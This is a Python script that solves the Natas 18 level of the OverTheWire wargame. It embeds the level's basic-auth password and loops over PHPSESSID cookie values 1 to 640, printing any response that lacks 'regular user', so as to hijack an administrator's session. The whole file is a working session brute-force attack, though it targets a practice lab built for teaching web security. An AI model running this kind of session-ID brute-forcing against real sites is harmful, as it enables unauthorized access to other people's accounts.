import requests
import string
from requests.auth import HTTPBasicAuth

basicAuth=HTTPBasicAuth('natas18','6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ')
sz = 641
url = "http://natas18.natas.labs.overthewire.org/index.php?debug"
for i in range(1,sz):
    phpsessid = "PHPSESSID="+str(i)
    head = {'Cookie':phpsessid}
    r = requests.get(url,headers=head,auth = basicAuth)
    if "regular user" not in r.text:
        print(i)
        print(r.text)
